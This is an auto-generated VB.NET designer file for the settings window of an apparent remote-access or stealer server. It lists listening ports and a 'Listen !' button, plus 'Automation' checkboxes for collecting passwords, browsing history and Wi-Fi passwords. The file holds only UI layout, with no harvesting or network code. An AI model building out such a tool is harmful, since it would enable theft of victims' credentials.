<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Settings_Form
    Inherits Custom_Form

    'Form remplace la méthode Dispose pour nettoyer la liste des composants.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requise par le Concepteur Windows Form
    Private components As System.ComponentModel.IContainer

    'REMARQUE : la procédure suivante est requise par le Concepteur Windows Form
    'Elle peut être modifiée à l'aide du Concepteur Windows Form.  
    'Ne la modifiez pas à l'aide de l'éditeur de code.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim ListViewItem1 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("8080")
        Dim ListViewItem2 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("9000")
        Dim ListViewItem3 As System.Windows.Forms.ListViewItem = New System.Windows.Forms.ListViewItem("9080")
        Me.Button1 = New WindowsFormsAero.Button()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.AeroListView1 = New Server.AeroListView()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.AddToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoveToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Pass_CHK = New System.Windows.Forms.CheckBox()
        Me.Hist_CHK = New System.Windows.Forms.CheckBox()
        Me.WF_CHK = New System.Windows.Forms.CheckBox()
        Me.AeroGroupBox1 = New Server.AeroGroupBox()
        Me.Button2 = New WindowsFormsAero.Button()
        Me.Custom_Button1 = New Server.Custom_Button()
        Me.Label1 = New System.Windows.Forms.Label()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.AeroGroupBox1.SuspendLayout()
        Me.SuspendLayout()
        '
        'Button1
        '
        Me.Button1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.Button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Silver
        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Button1.Location = New System.Drawing.Point(4, 304)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(348, 43)
        Me.Button1.TabIndex = 20
        Me.Button1.Text = "Listen !"
        Me.Button1.UseCompatibleTextRendering = True
        Me.Button1.UseVisualStyleBackColor = True
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.NumericUpDown1.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.NumericUpDown1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.NumericUpDown1.Location = New System.Drawing.Point(4, 33)
        Me.NumericUpDown1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.NumericUpDown1.Maximum = New Decimal(New Integer() {90000, 0, 0, 0})
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(348, 20)
        Me.NumericUpDown1.TabIndex = 2
        Me.NumericUpDown1.Value = New Decimal(New Integer() {8080, 0, 0, 0})
        Me.NumericUpDown1.Visible = False
        '
        'AeroListView1
        '
        Me.AeroListView1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.AeroListView1.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.AeroListView1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.AeroListView1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.AeroListView1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.AeroListView1.HideSelection = False
        Me.AeroListView1.Items.AddRange(New System.Windows.Forms.ListViewItem() {ListViewItem1, ListViewItem2, ListViewItem3})
        Me.AeroListView1.Location = New System.Drawing.Point(4, 44)
        Me.AeroListView1.Name = "AeroListView1"
        Me.AeroListView1.Size = New System.Drawing.Size(348, 199)
        Me.AeroListView1.TabIndex = 23
        Me.AeroListView1.UseCompatibleStateImageBehavior = False
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.AddToolStripMenuItem, Me.RemoveToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(118, 48)
        '
        'AddToolStripMenuItem
        '
        Me.AddToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.AddToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.AddToolStripMenuItem.Name = "AddToolStripMenuItem"
        Me.AddToolStripMenuItem.Size = New System.Drawing.Size(117, 22)
        Me.AddToolStripMenuItem.Text = "Add"
        '
        'RemoveToolStripMenuItem
        '
        Me.RemoveToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.RemoveToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.RemoveToolStripMenuItem.Name = "RemoveToolStripMenuItem"
        Me.RemoveToolStripMenuItem.Size = New System.Drawing.Size(117, 22)
        Me.RemoveToolStripMenuItem.Text = "Remove"
        '
        'Pass_CHK
        '
        Me.Pass_CHK.AutoSize = True
        Me.Pass_CHK.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Pass_CHK.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Pass_CHK.Location = New System.Drawing.Point(6, 19)
        Me.Pass_CHK.Name = "Pass_CHK"
        Me.Pass_CHK.Size = New System.Drawing.Size(74, 17)
        Me.Pass_CHK.TabIndex = 24
        Me.Pass_CHK.Text = "Passwords"
        Me.Pass_CHK.UseVisualStyleBackColor = True
        '
        'Hist_CHK
        '
        Me.Hist_CHK.AutoSize = True
        Me.Hist_CHK.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Hist_CHK.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Hist_CHK.Location = New System.Drawing.Point(98, 19)
        Me.Hist_CHK.Name = "Hist_CHK"
        Me.Hist_CHK.Size = New System.Drawing.Size(55, 17)
        Me.Hist_CHK.TabIndex = 25
        Me.Hist_CHK.Text = "History"
        Me.Hist_CHK.UseVisualStyleBackColor = True
        '
        'WF_CHK
        '
        Me.WF_CHK.AutoSize = True
        Me.WF_CHK.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.WF_CHK.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.WF_CHK.Location = New System.Drawing.Point(162, 19)
        Me.WF_CHK.Name = "WF_CHK"
        Me.WF_CHK.Size = New System.Drawing.Size(95, 17)
        Me.WF_CHK.TabIndex = 26
        Me.WF_CHK.Text = "Wifi Passwords"
        Me.WF_CHK.UseVisualStyleBackColor = True
        '
        'AeroGroupBox1
        '
        Me.AeroGroupBox1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.AeroGroupBox1.Controls.Add(Me.Button2)
        Me.AeroGroupBox1.Controls.Add(Me.Pass_CHK)
        Me.AeroGroupBox1.Controls.Add(Me.WF_CHK)
        Me.AeroGroupBox1.Controls.Add(Me.Hist_CHK)
        Me.AeroGroupBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.AeroGroupBox1.Location = New System.Drawing.Point(4, 249)
        Me.AeroGroupBox1.Name = "AeroGroupBox1"
        Me.AeroGroupBox1.Size = New System.Drawing.Size(348, 49)
        Me.AeroGroupBox1.TabIndex = 27
        Me.AeroGroupBox1.TabStop = False
        Me.AeroGroupBox1.Text = "Automation"
        '
        'Button2
        '
        Me.Button2.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button2.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Button2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.Button2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Silver
        Me.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Button2.Location = New System.Drawing.Point(266, 14)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(76, 24)
        Me.Button2.TabIndex = 28
        Me.Button2.Text = "Save !"
        Me.Button2.UseCompatibleTextRendering = True
        Me.Button2.UseVisualStyleBackColor = True
        '
        'Custom_Button1
        '
        Me.Custom_Button1.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Custom_Button1.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(120, Byte), Integer), CType(CType(215, Byte), Integer))
        Me.Custom_Button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(10, Byte), Integer), CType(CType(130, Byte), Integer), CType(CType(225, Byte), Integer))
        Me.Custom_Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Custom_Button1.ForeColor = System.Drawing.Color.White
        Me.Custom_Button1.Location = New System.Drawing.Point(328, 0)
        Me.Custom_Button1.Name = "Custom_Button1"
        Me.Custom_Button1.Size = New System.Drawing.Size(28, 28)
        Me.Custom_Button1.TabIndex = 37
        Me.Custom_Button1.Text = "X"
        Me.Custom_Button1.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(159, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(1, 16)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(34, 13)
        Me.Label1.TabIndex = 38
        Me.Label1.Text = "Ports:"
        '
        'Settings_Form
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(16, Byte), Integer), CType(CType(26, Byte), Integer), CType(CType(39, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(356, 350)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.Custom_Button1)
        Me.Controls.Add(Me.AeroGroupBox1)
        Me.Controls.Add(Me.AeroListView1)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.NumericUpDown1)
        Me.DoubleBuffered = True
        Me.Name = "Settings_Form"
        Me.Padding = New System.Windows.Forms.Padding(1, 1, 1, 0)
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Settings"
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.AeroGroupBox1.ResumeLayout(False)
        Me.AeroGroupBox1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents NumericUpDown1 As NumericUpDown
    Friend WithEvents Button1 As WindowsFormsAero.Button
    Friend WithEvents AeroListView1 As AeroListView
    Friend WithEvents ContextMenuStrip1 As ContextMenuStrip
    Friend WithEvents AddToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoveToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Pass_CHK As CheckBox
    Friend WithEvents Hist_CHK As CheckBox
    Friend WithEvents WF_CHK As CheckBox
    Friend WithEvents AeroGroupBox1 As AeroGroupBox
    Friend WithEvents Button2 As WindowsFormsAero.Button
    Friend WithEvents Custom_Button1 As Custom_Button
    Friend WithEvents Label1 As Label
End Class
